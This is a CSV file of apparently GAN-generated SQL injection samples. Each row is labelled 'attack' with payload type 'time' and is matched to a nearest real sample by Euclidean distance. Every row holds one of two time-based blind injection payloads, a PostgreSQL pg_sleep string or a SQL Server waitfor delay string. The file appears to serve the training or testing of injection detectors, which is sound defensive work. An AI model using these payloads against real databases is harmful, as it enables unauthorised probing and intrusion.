id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.1854391941659905
GAN_000002,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,3.98779323404625
GAN_000003,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.384319104707277
GAN_000004,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.116168865562087
GAN_000005,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.103953220188895
GAN_000006,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.073646763686923
GAN_000007,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.194797716158749
GAN_000008,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.157161204741479
GAN_000009,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.212705567044025
GAN_000010,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.351593746514188
GAN_000011,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.036990505387663
GAN_000012,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.022914435955968
GAN_000013,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.248059073154594
GAN_000014,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.038864034454873
GAN_000015,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.2347508569953165
GAN_000016,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.143801609019156
GAN_000017,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.150131589855298
GAN_000018,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.170668308326709
GAN_000019,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.342643216208623
GAN_000020,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.250055819765521
GAN_000021,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.006534488194077
GAN_000022,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.210092339477195
GAN_000023,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.1814360667499395
GAN_000024,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.072256988640724
GAN_000025,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.179973588511391
GAN_000026,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.017164623368796
GAN_000027,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.386207444689143
GAN_000028,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.236119125770783
GAN_000029,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,3.9831941263798782
GAN_000030,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,3.9858918403656034
GAN_000031,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.134198339851283
